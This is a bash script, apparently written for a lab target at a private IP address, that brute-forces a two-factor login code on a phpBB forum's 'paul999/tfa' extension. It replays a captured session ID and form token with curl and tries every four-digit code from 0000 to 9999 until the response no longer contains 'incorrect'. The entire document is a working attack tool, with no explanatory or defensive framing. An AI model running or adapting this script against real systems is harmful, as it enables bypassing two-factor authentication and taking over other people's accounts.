#!/bin/bash

target=172.20.0.250

for i in $(seq 0 9999); do
	totp=$(printf "%04d" "$i")
	resp=$(curl "http://$target/app.php/paul999/tfa/save/2/0/0/1/otp/?sid=cdeab36ece148cd35fba77a53485f9f1" --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.7,cs;q=0.3' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H "Referer: http://$target/ucp.php?mode=login&sid=cdeab36ece148cd35fba77a53485f9f1" -H 'Content-Type: application/x-www-form-urlencoded' -H "Origin: http://$target" -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Priority: u=0, i' --data-raw 'creation_time=1736025434&form_token=292e5edd2b5e3d2bd7ec6ee9b23f1b3013e0d190&sid=cdeab36ece148cd35fba77a53485f9f1&random=7c8330dd5a0038d866540aa7bb8eacee1d0aa893&redirect=index.php&authenticate='"$totp" 2>/dev/null)
	echo "$resp" | grep 'incorrect' >/dev/null
	if [ $? -eq 1 ]; then
		echo "totp found: $i"
		exit
	fi
	if (( i % 100 == 0 )); then
		echo "at $i..."
	fi
done

echo "totp not found :("
